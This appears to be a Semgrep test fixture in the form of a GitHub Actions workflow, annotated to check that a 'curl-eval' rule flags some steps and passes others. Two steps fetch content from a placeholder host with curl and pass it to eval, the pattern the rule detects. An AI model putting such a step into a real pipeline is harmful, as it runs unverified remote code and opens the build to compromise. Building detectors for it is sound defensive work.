name: Build and deploy Semgrep scanner lambda

on:
  workflow_dispatch:
  push:
    branches: develop

jobs:
  docker-build:
    runs-on: ubuntu-latest
    env:
      workdir: lambdas/run-semgrep
    steps:
      - uses: actions/checkout@v2
      - name: Build Docker image
        working-directory:
          ${{ env.workdir }}/src
          # ok: curl-eval
        run: docker build -t semgrep-scanner:latest .
      - name:
          blah
          # ruleid: curl-eval
        run: |
          CONTENTS=$(curl https://blah.com)
          eval $CONTENTS

      - name: PowerShell step must not be bash-parsed
        shell: pwsh
        # ok: curl-eval
        run: |
          $cacheDirs = @("D:\cache")
          foreach ($dir in $cacheDirs) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
          }
      - name: explicit bash still detected
        shell: bash
        # ruleid: curl-eval
        run: |
          CONTENTS=$(curl https://blah.com)
          eval $CONTENTS
